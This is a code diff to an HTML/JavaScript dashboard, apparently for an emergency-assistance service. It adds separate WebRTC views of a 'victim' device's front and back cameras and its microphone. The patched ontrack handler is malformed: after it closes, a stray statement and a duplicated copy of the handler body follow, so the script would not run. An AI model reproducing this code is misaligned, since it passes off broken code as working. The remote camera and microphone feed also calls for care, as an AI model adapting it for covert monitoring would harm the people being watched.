@@ -598,12 +598,58 @@ Immediate assistance may be required.
 🎥 Live Victim Camera
 </h3>
 
+<div style="
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:15px;
+">
+
+<div>
+
+<h4 style="
+margin-bottom:8px;
+">
+🤳 FRONT CAMERA
+</h4>
+
 <video
-id="remoteVideo"
+id="frontRemoteVideo"
 autoplay
-playsinline>
+playsinline
+style="
+width:100%;
+background:#111;
+border-radius:15px;
+display:block;
+">
 </video>
 
+</div>
+
+
+<div>
+
+<h4 style="
+margin-bottom:8px;
+">
+📷 BACK CAMERA
+</h4>
+
+<video
+id="backRemoteVideo"
+autoplay
+playsinline
+style="
+width:100%;
+background:#111;
+border-radius:15px;
+display:block;
+">
+</video>
+
+</div>
+
+</div>
 <div
 id="videoStatus"
 class="video-status">
@@ -613,7 +659,12 @@ class="video-status">
 </div>
 
 </div>
+<!-- 🎙️ REMOTE MICROPHONE -->
 
+<audio
+    id="remoteAudio"
+    autoplay>
+</audio>
 
 <!-- VICTIM -->
 
@@ -913,6 +964,9 @@ let peerConnection = null;
 
 let currentCallId = null;
 
+let remoteAudioStream =
+    new MediaStream();
+
 let candidateListener = null;
 
 
@@ -1104,43 +1158,172 @@ async function connectToVictim(
        RECEIVE VIDEO + AUDIO
     ====================================== */
 
-    peerConnection.ontrack =
-    event => {
+   peerConnection.ontrack = event => {
 
-        const remoteVideo =
-            document
-            .getElementById("remoteVideo");
+    // 🎙️ MICROPHONE
+    if (event.track.kind === "audio") {
 
-
-        if (
-            remoteVideo.srcObject !==
-            event.streams[0]
-        ) {
-
-            remoteVideo.srcObject =
-                event.streams[0];
-
-        }
-
+        remoteAudioStream.addTrack(event.track);
 
         document
-            .getElementById("videoStatus")
-            .textContent =
-            "● LIVE CAMERA + AUDIO CONNECTED";
-
-
-        document
-            .getElementById("cameraState")
-            .textContent =
-            "● ACTIVE";
-
+            .getElementById("remoteAudio")
+            .srcObject = remoteAudioStream;
 
         document
             .getElementById("micState")
-            .textContent =
-            "● ACTIVE";
+            .textContent = "● ACTIVE";
 
-    };
+        return;
+    }
+
+
+    // 🎥 CAMERA
+    const incomingStream = event.streams[0];
+
+    if (!incomingStream) {
+        return;
+    }
+
+    const streamId = incomingStream.id;
+
+
+    // 🤳 FRONT CAMERA
+    if (
+        streamId ===
+        data.cameraStreams?.front
+    ) {
+
+        document
+            .getElementById("frontRemoteVideo")
+            .srcObject = incomingStream;
+
+    }
+
+
+    // 📷 BACK CAMERA
+    else if (
+        streamId ===
+        data.cameraStreams?.back
+    ) {
+
+        document
+            .getElementById("backRemoteVideo")
+            .srcObject = incomingStream;
+
+    }
+
+
+    document
+        .getElementById("videoStatus")
+        .textContent =
+        "● FRONT + BACK CAMERA CONNECTED";
+
+};
+    incomingStream.id;
+
+
+    /*
+    ==========================================
+    FRONT CAMERA
+    ==========================================
+    */
+
+    if (
+        streamId ===
+        data.cameraStreams?.front
+    ) {
+
+        document
+            .getElementById("frontRemoteVideo")
+            .srcObject =
+            incomingStream;
+
+    }
+
+
+    /*
+    ==========================================
+    BACK CAMERA
+    ==========================================
+    */
+
+    else if (
+        streamId ===
+        data.cameraStreams?.back
+    ) {
+
+        document
+            .getElementById("backRemoteVideo")
+            .srcObject =
+            incomingStream;
+
+    }
+
+
+    /*
+    ==========================================
+    AUDIO
+    ==========================================
+    */
+
+    else {
+
+        /*
+        The audio track doesn't need
+        a separate visible video element.
+
+        Attach it to the front video
+        so the audio can play.
+        */
+
+        const frontVideo =
+            document
+            .getElementById("frontRemoteVideo");
+
+
+        if (
+            frontVideo.srcObject
+        ) {
+
+            const combinedStream =
+                frontVideo.srcObject;
+
+
+            if (
+                !combinedStream
+                .getAudioTracks()
+                .length
+            ) {
+
+                combinedStream.addTrack(
+                    event.track
+                );
+
+            }
+
+        }
+
+    }
+
+
+    document
+        .getElementById("videoStatus")
+        .textContent =
+        "● FRONT + BACK CAMERA CONNECTED";
+
+
+    document
+        .getElementById("cameraState")
+        .textContent =
+        "● ACTIVE";
+
+
+    document
+        .getElementById("micState")
+        .textContent =
+        "● ACTIVE";
+
+};
 
 
     /* ======================================
